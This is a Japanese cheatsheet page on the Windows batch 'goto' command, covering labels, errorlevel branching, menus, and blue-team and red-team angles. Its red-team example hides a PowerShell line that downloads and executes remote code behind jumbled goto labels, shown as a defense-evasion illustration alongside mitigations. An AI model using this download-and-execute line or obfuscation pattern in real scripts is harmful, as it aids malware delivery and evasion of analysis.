---
tags:
  - 'goto'
  - 'cmd'
  - 'cheatsheet'
title: 'goto - バッチファイル内の指定した行にジャンプする'
summary: 'バッチファイル内のラベルでマークされた行に、スクリプトの実行を無条件にジャンプさせます。条件分岐やループ処理の制御に使用されます。'
related:
  - 'if'
  - 'call'
---

# `goto` - バッチファイル内の指定した行にジャンプする

## 概要

`goto` コマンドは、バッチファイル (`.bat`, `.cmd`) 内で、プログラムの実行フローを制御するために使用されます。`goto` は、`:<label_name>` という形式で定義された**ラベル**に、実行を無条件でジャンプさせます。主に `if` コマンドと組み合わせて条件分岐を実現したり、エラー処理、メニュー選択、単純なループを作成したりするために使われます。

(出自: `Windows標準搭載`)

## 類似コマンドと差異

| 類似コマンド | 差異 / 使い分けのポイント | 推奨 (あれば) |
| :--- | :--- | :--- |
| **`call`** | `call :<label>` はサブルーチンとしてラベルを呼び出し、処理が終わると**呼び出し元に戻ってきます**。`goto` は一方的にジャンプするだけで、**戻ってきません**。 | `call` (サブルーチン) |
| **`for`** | `for` は、ファイルやコマンド出力などのデータセットに基づいて**構造化されたループ**を提供します。`goto` は、より単純で自由な（しかし読みにくい）ループを作成するために使われます。 | `for` (構造化ループ) |
| **PowerShell** | PowerShellでは `goto` は使われず、`if`/`else`, `switch`, `while`, `for`, `foreach` などの構造化された制御構文を使用します。 | - |

## よく連携されるコマンド

`goto` の最も一般的な使い方は、`if` コマンドと連携した条件分岐です。

### シナリオ例: エラーレベルに基づいた条件分岐 (インフラ構築・運用視点)

* **目的**: 前のコマンドが成功したか失敗したか (`ERRORLEVEL`) に基づいて、処理を分岐させる。
* **連携コマンド**: `if`, `errorlevel`
* **解説**: コマンドが成功すると `ERRORLEVEL` は `0` に、失敗すると `0` 以外になります。`if errorlevel 1` (または `if not errorlevel 0`) を使って失敗を検知し、`goto` でエラー処理セクションにジャンプさせます。
* **コマンド例**:

    ```cmd
    @echo off
    robocopy C:\Source D:\Backup /E

    REM robocopyが成功(ERRORLEVEL < 8)しなかった場合、エラー処理へ
    if %ERRORLEVEL% GEQ 8 (
        echo Robocopy failed with error level %ERRORLEVEL%.
        goto :error_handler
    )

    echo Backup successful.
    goto :end

    :error_handler
    echo Sending error alert...
    REM ... (エラー通知処理) ...

    :end
    echo Script finished.
    ```

## スイッチ/オプション説明

| スイッチ/オプション | 説明 |
| :--- | :--- |
| **ジャンプ先** | |
| ⭐ `<label>` | ジャンプ先のラベル名を指定します。ラベルは行頭がコロン `:` で始まります。（例: `goto start_process`） |
| ⭐ `:EOF` | **ファイルの終端 (End Of File)** を示す特別なラベル。`goto :EOF` は、バッチファイルの処理を終了させるための定型句です。 |

## よく使われる組み合わせと業務シナリオ

### 1. インフラ構築・運用視点

* **タスク**: ユーザーの入力に応じて処理を選択する、簡易的なメニューを作成する。
* **組み合わせ**: `set /p`, `if`, `goto`
* **解説**: `set /p` でユーザーからの入力を待ち受け、`if` で入力内容を判定し、`goto` で対応する処理セクションにジャンプさせます。
* **例**:

    ```cmd
    @echo off
    :menu
    echo 1. Check disk space
    echo 2. Run backup
    echo 3. Exit
    set /p choice="Enter your choice: "

    if "%choice%"=="1" goto :check_disk
    if "%choice%"=="2" goto :run_backup
    if "%choice%"=="3" goto :EOF

    echo Invalid choice.
    goto :menu

    :check_disk
    chkdsk C:
    goto :menu

    :run_backup
    call backup.bat
    goto :menu
    ```

### 2. ブルーチーム視点

* **タスク**: 難読化された悪意のあるバッチファイルの動作を分析する。
* **組み合わせ**: (コードレビュー)
* **解説**: 攻撃者は、`goto` を多用してスクリプトの実行フローを意図的に複雑にし、処理の流れを追いづらくすることがあります（スパゲッティコード）。ブルーチームは、これらの `goto` を1つずつ追いかけ、最終的にどのような処理が実行されるのかを根気強く解読する必要があります。
* **例**: -

### 3. レッドチーム視点

* **タスク**: **防御回避 (Defense Evasion)** のために、悪意のあるバッチファイルを難読化する。
* **組み合わせ**: `goto`
* **解説**: 攻撃者は、無意味な `goto` ジャンプを多用したり、ラベル名をランダムな文字列にしたりすることで、静的解析ツールによる検知を回避しようと試みます。
* **例**:

    ```cmd
    @echo off
    goto :aBcDe
    :xYz12
    powershell -c "iex(new-object net.webclient).downloadstring('http://...')"
    goto :EOF
    :aBcDe
    set x=1
    goto :xYz12
    ```

## エラーメッセージとトラブルシューティング

### よくあるエラーメッセージ

1. **エラーメッセージ**: `The system cannot find the batch label specified - <label_name>`
    * **考えられる原因**: `goto <label_name>` で指定したラベルが、バッチファイル内に存在しません。
    * **解決策**: ラベル名のスペルが正しいか、コロン `:` で始まるラベルがファイル内に定義されているかを確認してください。ラベル名では大文字と小文字は区別されません。

## 環境変数と設定ファイル

* `goto` はバッチファイル内のフロー制御機能であり、環境変数には直接影響されません。
* 一般的な環境変数は、[CMD共通の環境変数・設定ファイル](./environment_and_config.md)で解説。

## セキュリティに関する考慮事項

### 脆弱性と悪用事例

* **脆弱性**: `goto` 自体ではなく、それを使った**難読化**がセキュリティ上の課題となります。
* **悪用シナリオ**: レッドチームのシナリオで述べた通り、`goto` は悪意のあるスクリプトの実行フローを複雑にし、分析を妨害するために利用されます。

### LOLBAS (Living Off The Land Binaries and Scripts) における利用例

* **機能**: **防御回避 (Defense Evasion)**
* **解説**: `goto` は `cmd.exe` の内部コマンドであり、`cmd.exe` を使ったスクリプトベースの攻撃で、ロジックを難読化するために使用されます。

### 対応策・緩和策 (ブルーチーム視点)

* **Prevention (予防)**: AppLockerやWDACで、信頼できないバッチファイルの実行を制限する。
* **Detection (検知)**: PowerShellのスクリプトブロックロギングやコマンドライン引数の監査を有効化し、難読化されたスクリプトから最終的に実行される悪意のあるコマンド（PowerShellなど）を捉える。

## 注意点・補足

* **スパゲッティコード**: `goto` を多用すると、プログラムの流れが非常に分かりにくくなる「スパゲッティコード」になりがちです。可能な限り `if` や `for`、`call` を使った構造化された記述を心がけるべきです。
* **`:EOF`**: `goto :EOF` は、バッチファイル（または `call` で呼び出されたサブルーチン）を正常に終了させるための標準的な方法です。

---
[CMDインデックスに戻る](../../cmd_index.md)
